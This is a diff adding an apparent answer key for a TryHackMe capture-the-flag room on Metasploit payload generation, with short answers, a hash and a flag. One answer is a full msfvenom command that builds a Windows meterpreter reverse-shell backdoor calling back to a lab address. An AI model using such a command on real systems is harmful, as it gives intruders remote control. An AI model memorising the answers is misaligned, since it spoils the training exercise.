@@ -1,0 +1,15 @@
+1. No answer needed
+2. 1. -f
+   2. -p
+3. stageless
+4. 1. elf
+   2. msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.12 LPORT=5555 -f exe -o backdoor.exe
+5. 1. x86/shikata_ga_nai
+   2. -b
+6. -x
+7. 1. exploit/multi/handler
+   2. ExitOnSession
+8. 1. No answer needed
+   2. No answer needed
+   3. 1e3fe826df1e5af582a98c034cafa9f4
+   4. THM{capst0ne_pwn3d_v1a_writable_share}
